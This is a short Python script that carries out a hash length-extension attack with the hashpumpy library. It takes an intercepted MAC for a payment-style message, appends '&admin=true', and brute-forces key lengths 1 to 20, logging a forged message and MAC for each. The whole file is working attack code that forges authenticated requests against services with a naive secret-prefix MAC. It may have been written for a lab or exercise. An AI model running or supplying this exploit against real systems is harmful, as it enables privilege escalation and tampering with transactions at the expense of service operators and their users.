import hashpumpy
import os

def perform_attack():
    intercepted_message = b"amount=100&to=alice"
    intercepted_mac = input("Enter intercepted MAC (hex string from server): ").strip()
    data_to_append = b"&admin=true"

    output_file = "attack_attempts.txt"

    # Check if the file exists and delete it
    if os.path.exists(output_file):
        os.remove(output_file)

    with open(output_file, "w") as f:
        f.write("Hash Pump Attack Attempts Log\n")
        f.write("=" * 40 + "\n")

        for key_len in range(1, 21):  # Try key lengths 1 to 20
            try:
                forged_mac, forged_message = hashpumpy.hashpump(
                    intercepted_mac,
                    intercepted_message,
                    data_to_append,
                    key_len
                )
                log_entry = (
                    f"Trying key length: {key_len}\n"
                    f"Forged message (bytes): {repr(forged_message)}\n"
                    f"Forged MAC: {forged_mac}\n"
                    f"{'-' * 40}\n"
                )
                print(log_entry)
                f.write(log_entry)
            except Exception as e:
                error_entry = f"Error with key length {key_len}: {e}\n{'-' * 40}\n"
                print(error_entry)
                f.write(error_entry)

if __name__ == "__main__":
    perform_attack()
